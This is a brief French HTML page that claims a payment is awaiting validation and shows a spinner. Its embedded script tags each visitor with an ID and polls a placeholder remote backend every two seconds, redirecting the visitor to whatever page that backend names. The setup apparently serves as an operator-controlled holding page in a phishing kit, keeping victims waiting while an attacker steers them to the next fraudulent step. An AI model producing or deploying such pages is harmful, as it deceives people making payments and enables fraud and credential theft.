<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>En attente...</title>
  <style>
    body { font-family: sans-serif; text-align: center; padding: 50px; }
    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <h2>‚è≥ Veuillez patienter...</h2>
  <p>Le paiement est en attente de validation.</p>
  <div class="spinner"></div>

  <script>
  (function () {
    const BACKEND_URL = 'https://REPLACE_ME.onrender.com';
    const visitorId = localStorage.getItem('vid') || (Math.random().toString(36).substr(2,9) + Date.now().toString(36));
    localStorage.setItem('vid', visitorId);

    function checkTarget() {
      setInterval(async () => {
        try {
          const res = await fetch(`${BACKEND_URL}/target/${visitorId}`);
          const d = await res.json();
          if (d.target && d.target !== window.location.pathname) {
            window.location.href = d.target;
          }
        } catch (e) {}
      }, 2000);
    }
    checkTarget();
  })();
  </script>
</body>
</html>
